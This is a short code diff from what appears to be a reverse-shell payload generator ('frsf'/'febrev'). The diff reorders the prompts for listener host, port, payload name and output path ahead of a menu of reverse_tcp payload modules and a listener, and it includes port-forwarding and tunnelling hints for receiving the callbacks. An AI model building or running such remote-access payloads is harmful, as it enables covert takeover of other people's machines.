@@ -16,7 +16,22 @@ print(f"""
 TO YOUR ROUTER/PUBLIC IP..........IF YOUR ROUTER/PUBLIC IP DO NOT SUPPORT PORT FORWARDING USE THIS IP IN THE LHOST >>> {serveo}
 OPEN ANOTHER SESSION/TERMINAL AND RUN THE PORTFORWARDING MODULE >>>> python3 portforward.py
 AND ENTER THE SAME PORT ENTERED IN THE LPORT......lport must be above 1024....
+
+
 """) 
+
+lhost=click.prompt("frsf(lhost)#> ", type=str, default=socket.gethostbyname(socket.gethostname()))
+print("LHOST ==> ",lhost)
+print("")
+lport=click.prompt("frsf(lport)#> ", type=str, default="6565")
+print("LPORT ==> ",lport)
+print("")
+name=click.prompt("frsf(name)#> ", type=str, default="febrev")
+print("PAYLOAD NAME ==> ",name)
+print("")
+output=click.prompt("frsf(output path)#> ", type=str, default=os.path.expanduser("~"))
+print("PAYLOAD PATH ==> ",output)
+print("")
 print("""Available payload modules>>>
  
 [1] linux_debian/reverse_tcp
@@ -31,19 +46,8 @@ print("""Available payload modules>>>
 [10] python/linux_termux/reverse_tcp
 
 [L] febrev-listener
+
 """)
-lhost=click.prompt("frsf(lhost)#> ", type=str, default=socket.gethostbyname(socket.gethostname()))
-print("LHOST ==> ",lhost)
-print("")
-lport=click.prompt("frsf(lport)#> ", type=str, default="6565")
-print("LPORT ==> ",lport)
-print("")
-name=click.prompt("frsf(name)#> ", type=str, default="febrev")
-print("PAYLOAD NAME ==> ",name)
-print("")
-output=click.prompt("frsf(output path)#> ", type=str, default=os.path.expanduser("~"))
-print("PAYLOAD PATH ==> ",output)
-print("")
 payload=input("frsf(choose payload)#> ")
 if payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
